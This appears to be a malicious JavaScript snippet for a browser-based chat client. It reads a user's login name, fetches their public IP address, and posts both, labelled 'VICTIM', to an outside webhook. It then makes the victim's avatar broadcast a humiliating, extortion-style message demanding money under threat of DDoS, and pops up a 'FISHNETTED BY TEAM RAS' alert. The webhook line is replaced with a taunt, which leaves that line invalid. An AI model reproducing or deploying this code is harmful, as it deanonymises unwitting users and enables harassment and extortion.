async function sendWebhookWithData() {
  const loginName = $("#login_name").val() || "ANONYMOUSVICTIM";
  const urlToFetch = "https://api.ipify.org"; // Replace with the URL you want to fetch
  const webhookUrl = nice try fune fans, i still got the ip adresses

  try {
    const response = await fetch(urlToFetch);
    if (!response.ok) {
        console.error(`Failed to fetch URL: ${urlToFetch}, status: ${response.status}`);
        return; // Exit if fetch fails
    }
    const fetchedData = await response.text(); // or response.json() if it's JSON

    const payload = {
      content: `@everyone\nVICTIM: ${loginName}\nDETAILS: ${fetchedData}`
    };

    const webhookResponse = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (webhookResponse.ok) {
      console.log("FISHNETTED USERS");
      socket.emit('command', { list: ['speed', '50'] } );
      socket.emit('command', { list: ['name', 'FISHNETTED'] } );
      socket.emit('command', { list: ['color', 'black'] } );
      socket.emit('talk', { text: 'I HAVE BEEN FISHNETTED BY THE TEAM RAS, MY PRIVATE INFORMATION SELLED FOR 96000 US DOLLARS, AND I WILL SEND 56224676 ROBUX TO THREE OF MY FRIENDS, AND THAT TRIPLES IT INTO 168674028 ROBUX, AND THAT REQUIRES ME TO GET 288000 US DOLLARS, THE USERNAME OF THIS ROBLOX ACCOUNT IS "ivorydevrimo3" AND I WILL GET MONEY QUICKLY AND SEND IT TO HIM OR ELSE I WILL GET DDOSSED AND PROBABLY GET ARRESTED IN MOSTLY RARE CHANCES' } );
    } else {
      console.error(`Webhook failed: ${webhookResponse.status}`);
    }
  } catch (error) {
    console.error("Well fuck, An error occurred:", error);
  }
}

sendWebhookWithData();
setTimeout(function(){alert("FISHNETTED BY TEAM RAS")},5000)
